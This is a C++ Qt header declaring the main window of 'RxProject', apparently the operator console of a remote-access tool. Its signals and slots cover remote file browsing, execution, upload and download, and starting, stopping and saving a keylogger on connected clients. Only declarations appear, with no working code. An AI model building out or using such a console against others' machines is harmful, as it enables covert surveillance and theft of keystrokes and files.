#ifndef __RXPROJECT_H__
#define __RXPROJECT_H__

#include	<QtGui/QMainWindow>
#include	<QSound>
#include	<string>
#include	"ui_RxProject.h"
#include	"RxBridge.h"
#include	"RxFileSystem.h"

class RxProject : public QMainWindow
{
	Q_OBJECT

private:
	RxBridge			p_bridge;
	RxFileSystem		p_fs;

public:
	RxProject(QWidget *parent = 0, Qt::WFlags flags = 0);
	~RxProject();

private:
	Ui::RxProjectClass	ui;

signals:
	void				WinAskVer(std::string);
	void				WinAskFs(std::string);
	void				WinAskKeyLogInfos(std::string);
	void				WinAskCd(std::string, std::string);
	void				WinAskDel(std::string, std::string);
	void				WinAskCpy(std::string, std::string);
	void				WinAskPst(std::string);
	void				WinAskRnm(std::string, std::string, std::string);
	void				WinAskCrt(std::string, std::string, std::string);
	void				WinAskExe(std::string, std::string);
	void				WinAskAkl(std::string);
	void				WinAskOkl(std::string);
	void				WinAskCkl(std::string);
	void				WinAskDwn(std::string, std::string);
	void				WinAskUpl(std::string, std::string);

public slots:
	/* From Bridge */
	void				NewMonitorEventIncident(std::string);
	void				NewMonitorEventSendind(std::string, unsigned int);
	void				NewMonitorEventReception(std::string, unsigned int);
	void				NewUpDownEvent(std::string);
	void				NetAnswerKeyLogInfos(std::string, bool, std::string);
	void				ClientIdentified(std::string);
	void				ClientCrashed(std::string);
	void				ClientAnsVersion(std::string, std::string);
	void				ClientAnsFs(std::string, FileInfo);
	void				ClientAnsFsNext(std::string, FileInfo);
	void				ClientAnsKeyPressed(std::string, std::string);
	/* From Bridge, Updown */
	void				UpdnIncident(std::string);
	void				UpdnNewPartRec(int, int);
	void				UpdnDlFinished();
	void				UpdnNewPartSnd(int, int);
	void				UpdnUpFinished();

	/* From self */
	void				LWCDoubleClicked(QListWidgetItem*);
	void				LWFSDoubleClicked(QListWidgetItem*);
	void				PBDeleteClicked();
	void				PBCopyClicked();
	void				PBPasteClicked();
	void				PBRenameClicked();
	void				PBCreateFileClicked();
	void				PBExecClicked();
	void				PBStartKeyLogClicked();
	void				PBStopKeyLogClicked();
	void				PBClearKeyLogClicked();
	void				PBSaveKeyLogClicked();
	void				PBDownloadClicked();
	void				PBUploadClicked();
	void				TWAboutEnter(int);
};

#endif // __RXPROJECT_H__
